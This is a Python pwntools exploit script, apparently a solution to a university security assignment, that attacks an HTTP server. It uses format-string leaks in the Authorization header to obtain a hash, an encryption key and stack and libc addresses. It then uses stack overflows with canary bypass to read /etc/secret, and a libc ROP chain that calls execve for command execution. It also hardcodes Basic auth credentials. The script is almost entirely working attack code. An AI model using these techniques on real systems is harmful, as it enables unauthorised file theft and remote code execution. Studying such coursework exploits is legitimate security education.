#!/usr/bin/env python3

from pwn import *
import requests
import base64
import os

#elf = ELF("./server")
libc = ELF("./libc.so.6")

#context.binary = elf
context.log_level = 'debug'
context.arch = 'i386'
#context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

# Setup context
if args.LOCAL:
    auth_str = "Authorization: Basic dGVzdDowMjk3OTRkYjZlNzZjYjU1OTYxMzczMmQ3Yzk0YjI0YjM2MGJiNmYwNTg3OWJiOTllNzc2NTUxOGI1NWFiYzU3"
    addr = "127.0.0.1:8321"
else:
    addr = "http://project-2.csec.chatzi.org:8000/"
    auth_str = "Authorization: Basic YWRtaW46OGM2ZTJmMzRkZjA4ZTJmODc5ZTYxZWViOWU4YmE5NmY4ZDllOTZkODAzMzg3MGY4MDEyNzU2N2QyNzBkN2Q5Ng=="

def conn():

    if args.LOCAL:

        #gdbscript = """
        #    b main
        #    b post_param
        #    b *post_param+158
        #    b *post_param+302
        #"""
        #r = gdb.debug([elf.path], gdbscript=gdbscript)
        
        r = remote("127.0.0.1", 8321)
    
    else:
        r = remote("project-2.csec.chatzi.org", 8000)

    return r

# helper that prepares the HTTP Get requests for info leak
def prepare_get_req(option):

    # Task chooser
    if option == 1:
        payload = b'%7$s'
    elif option == 2:
        payload = b'%60$s'
    elif option == 3:
        payload = b'libc.%23$p canary.%27$p buffer.%30$p route()ret.%31$p:hello'

    # Make a proxy to dry-run the command
    proxy = process(["nc", "-l", "localhost", "8381"])

    # We need to make a GET request where we snipe the format string and get the canary
    b64 = base64.b64encode(payload)

    # Run curl then close process
    leaks = process(["curl",
        addr,
        "--proxy", "localhost:8381",
        "-H",
        "Authorization: Basic " + b64.decode(),
        "-v"])

    # Fetch the bytestring then close proxy
    request = proxy.clean(1)
    log.info("LEAK REQUEST: " + request.decode('utf-8'))
    leaks.close()
    proxy.close()

    #req = b'GET ' + addr.encode() + b'/ HTTP/1.1\r\n'
    #req += b'Host: ' + addr.encode() + b'\r\n'
    #req += b'User-Agent: noleak\r\n'
    #req += b'Accept: */*\r\n'
    #req += b'Authorization: Basic ' + b64 + b'\r\n'

    return request

# helper that performs the post request injection
def perform_post_req(payload):
    # Make a proxy to dry-run the command
    #proxy = process(["nc", "-l", "localhost", "8381"])

    # cURL POST Request
    req = process(["curl",
    addr,
    #"--proxy", "localhost:8381",
    "-X", "POST",
    "-H", auth_str,
    "-H", "Content-Length: 0",
    "-d", payload,
    "-v"])

    #request = proxy.clean(1)
    #log.info(request)
    #req.close()
    #proxy.close()

    #r.writeline(request)

    # fetch trash
    #req.recvuntil(b'Fetch the data using `payload` variable.')

    req.recvuntil(b'Fetch the data using `payload` variable.')

    #fetch RCE output
    response = req.clean(2).decode('latin')

    req.close()
    #r.interactive()

    return response

def leak_addresses():

    # Prepare the request
    request = prepare_get_req(3)

    # PROCEED
    r = conn()
    r.send(request)

    r.recvuntil(b'Invalid user: ')

    # FIRST, THE LIBC LEAK
    r.recvuntil(b'libc.')
    libc_string = r.recv(10)[2:]
    libc_leak = int(libc_string, 16)
    log.info("LIBC LEAK: " + hex(libc_leak))

    # SECOND, CANARY = "%27$p"
    r.recvuntil(b'canary.')
    # Remove the "0x" prefix and get the hex string
    canary_string = r.recv(10)[2:]
    
    # Replace the last two characters with "3d" aka "="
    augmented_canary_string = canary_string[:-2] + b'3d'
    
    # Convert the modified hex string to an integer
    canary_leak = int(augmented_canary_string, 16)
    log.info("CANARY LEAK: " + hex(canary_leak))

    # THIRD, A STACK LEAK CLOSE TO THE BUFFER
    r.recvuntil(b'buffer.')
    buffer_string = r.recv(10)[2:]
    buffer_leak = int(buffer_string, 16)
    
    # modify to reach the buffer, we want to land to the first AAAAs
    buffer_leak -= 108
    log.info("BUFFER LEAK: " + hex(buffer_leak))

    # FOURTH, route ret after check_auth() offset: 194a
    r.recvuntil(b'route()ret.')
    route_string = r.recv(10)[2:]
    route_leak = int(route_string, 16)
    
    # modify to reach the buffer, we want to land to the first AAAAs
    #route_leak -= 0x94a
    log.info("ROUTE LEAK: " + hex(route_leak))

    r.close()

    return libc_leak, canary_leak, buffer_leak, route_leak

# Helper to make \x00 to \x3d
def transform_null_bytes(bytestring):
    transformed = bytestring.replace(b'\x00', b'\x3d')
    return transformed

# Task 1 solver
def md5_fmt_extraction():
    
    log.info("####################### TASK 1 #######################\n")
    req = prepare_get_req(1)

    # init
    r = conn()

    # pwn
    r.sendline(req)
    r.recvuntil(b'Invalid user: admin:')

    md5_hash = r.recv(32)

    r.close()

    # TODO: generalize for any user not only admin
    log.info("MD5 HASH: " + md5_hash.decode('utf-8'))

    log.info("######################################################\n")

# Task 2 SOlver
def decrypt_key():

    # The target
    encrypted_pass = "8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"

    log.info("####################### TASK 2 #######################\n\n")

    log.info("~~~~~~~~ UNINTENTED SOLUTION: Info Leak ~~~~~~~~")
    # Setup the request to info leak
    req = prepare_get_req(2)

    r = conn()

    # Interact
    r.sendline(req)
    r.recvuntil(b'Invalid user: ')

    encryption_key = r.recv(32)
    log.info("ENCRYPTION KEY: " + encryption_key.decode('utf-8'))

    # Decrypt locally
    dec = process(['../pico/encryption/decrypt', encryption_key, encrypted_pass])

    passwd = dec.recvline()

    dec.close()

    log.info("PLAINTEXT PASSWORD: " + passwd.decode('utf-8'))

    log.info("~~~~~~~~ INTENTED SOLUTION: Paddy the Oracle ~~~~~~~~")
    log.info("(Takes about 20 minutes!)")

    oracle = process(["python3", "padding_oracles.py", encrypted_pass])
    oracle.wait()

    oracle.recvuntil(b'Decrypted message:  b\'')
    oracle.recv(16) # scrap 16 IV bytes
    crack = oracle.recv(12)
    log.info("PLAINTEXT PASSWORD: " + crack.decode('utf-8'))
    log.info("######################################################\n\n")

# redirect execution to send_file() function
# Task 3 Solver
def file_read():

    log.info("####################### TASK 3 #######################\n")

    # Change \x00 to '=' aka \x3d
    #if args.LOCAL:
    #    canary_hex = input("Enter the canary value in hexadecimal format (e.g., 0x12345678): ")
    #    canary = int(canary_hex, 16)
    #    canary &= 0xFFFFFF00  # Clear the last byte
    #    canary |= 0x3D  # Set the last byte to 0x3D
        
    # "Gather round folks"
    # Make GET request to leak info on the running server
    libc, canary, buffer, route_leak = leak_addresses()

    # GET THY BASE
    #elf.address = binary_base
    #log.info("SERVER BASE: " + hex(binary_base))

    # Calculate send_file address
    send_file = route_leak + 0x62D
    log.info("SEND_FILE ADDR: " + hex(send_file))

    # For debugging
    #input("Press [ENTER] to continue...")

    filename = b'/etc/secret='
    #cmd = b'./config/key='
    #cmd = b'./config/htpasswd='

    # FORMULATE THE PAYLOAD
    payload = b'A' * 12 
    payload += filename + b'B' * (40 - len(filename)) # 52 total
    payload += p32(buffer)
    payload += b'C' * 4
    payload += p32(canary)
        
    # ebp register original value at the start of post_param
    payload += p32(buffer+108) * 3

    payload += p32(send_file)
    payload += p32(0x1337)
    payload += p32(buffer)

    # clean up
    payload = transform_null_bytes(payload)

    # GO GO GO
    file_contents = perform_post_req(payload)
    log.info("FILE CONTENTS:")
    print(file_contents)
    log.info("######################################################\n\n")

# TEDDY picker
def libc_attacker(base, buffer, option):

    # GADGET COLLECTION
    pop_eax = 0x000283e2 + base
    pop_ebp = 0x0001a973 + base
    pop_ebx = 0x0001def6 + base
    pop_edi = 0x0001926d + base
    pop_edx = 0x00031035 + base
    pop_ecx_edx = 0x00031034 + base
    xor_eax = 0x0002ead0 + base
    int_80 = 0x000314a5 + base
    call_eax = 0x0001af15 + base

    # libc system() attack
    if option == 1:

        # PRELUDE
        libc.address = base
        rop = ROP(libc)

        # BLACK MAGIC
        #libc_system = libc.symbols['system']
        libc_system = 0x41780 + base
        #libc_system = 0x411B0 + base

        """
            Dump of assembler code for function system:
            0xf7b45780 <+0>:	endbr32 
            0xf7b45784 <+4>:	call   0xf7c47b41
            0xf7b45789 <+9>:	add    edx,0x1a9877
            0xf7b4578f <+15>:	sub    esp,0xc
            0xf7b45792 <+18>:	mov    eax,DWORD PTR [esp+0x10]
            0xf7b45796 <+22>:	test   eax,eax
            0xf7b45798 <+24>:	je     0xf7b457a8 <system+40>
            0xf7b4579a <+26>:	add    esp,0xc
            0xf7b4579d <+29>:	jmp    0xf7b451b0
            0xf7b457a2 <+34>:	lea    esi,[esi+0x0]
            0xf7b457a8 <+40>:	lea    eax,[edx-0x5cc95]
            0xf7b457ae <+46>:	call   0xf7b451b0
            0xf7b457b3 <+51>:	test   eax,eax
            0xf7b457b5 <+53>:	sete   al
            0xf7b457b8 <+56>:	add    esp,0xc
            0xf7b457bb <+59>:	movzx  eax,al
            0xf7b457be <+62>:	ret    
        """

        # ADDAGGIO
        rop_chain = p32(libc_system)

        #log.info(rop_chain)
        return rop_chain
    
    # ONE GADGET ATTACK SCENARIO FOR POPPING A SHELL
    elif option == 2:
        # CONTRAINTS: eax == NULL && ebp points to the start of the RW section of libc
        libc_one = base + 0x14482b # 2nd output on target libc
        log.info("LIBC ONE: " + hex(libc_one))

        return p32(libc_one)

    # SHELLCODE ME A SYSCALL
    elif option == 3:
        # the code we are trying to emulate:
        """
            /* execve(path='ebx', argv='ecx', envp='edx') */
            mov ebx, edi
            xor ecx, ecx     /* arguments */
            xor edx, edx     /* NULL env */
            /* call execve() */
            push SYS_execve /* 0xb */
            pop eax
            int 0x80
        """

        rop_chain = p32(pop_ebx) + p32(buffer)
        rop_chain += p32(pop_ecx_edx) + b'====' + b'===='
        rop_chain += p32(pop_eax) + p32(0xb)
        rop_chain += p32(pop_edi) + b'====' + p32(int_80)

        return rop_chain

# Task 4 Solver
def command_execution():

    log.info("####################### TASK 4 #######################\n")

    # "Gather round folks"
    # Make GET request to leak info on the running server
    libc, canary, buffer, route_leak = leak_addresses()

    # GET THY BASE
    #elf.address = binary_base
    #log.info("SERVER BASE: " + hex(binary_base))

    # For debugging
    #input("Press [ENTER] to continue...")

    # Calculate libc base
    #if args.LOCAL:
    #    libc_base = libc - 468413 # 725BD -- LOCAL 
    #else:
    libc_base = libc - 451872 # 6E520 -- REMOTE 2.31

    log.info("LIBC BASE: " + hex(libc_base))

    # ONE-SHOT
    libc_one = libc_attacker(libc_base, buffer, 3)

    cmd = b'/usr/bin/lspci='

    # FORMULATE THE PAYLOAD
    payload = b'A' * 12 
    payload += cmd + b'B' * (40 - len(cmd)) # 52 total

    payload += p32(buffer)
    payload += b'C' * 4
    payload += p32(canary)
        
    # Instead we will use the start of the libc's RW section,
    # which can be calculated by adding the offset 0x1EB000
    ## one_gadget specific
    #magic_the_gathering = libc_base + 0x1EB000 #voila
    #payload += p32(magic_the_gathering) * 2 # 4 bytes each

    #payload += b'D' * 4

    # ebp register original value at the start of post_param
    payload += p32(buffer+108) * 3
    payload += libc_one

    # clean up null bytes
    payload = transform_null_bytes(payload)

    # go,go,go
    command_output = perform_post_req(payload)
    log.info("COMMAND: " + cmd.decode('utf-8'))
    log.info("COMMAND OUTPUT:")
    print(command_output)
    log.info("######################################################\n\n")

def main():

    # Task 1. Fetch the MD5
    md5_fmt_extraction()
    sleep(1)

    # Task 2. Decrypt the password
    decrypt_key()
    sleep(1)

    # Task 3. Read /etc/secret
    file_read()
    sleep(1)

    # Task 4. Command execution
    command_execution()
    sleep(1)


if __name__ == "__main__":
    main()
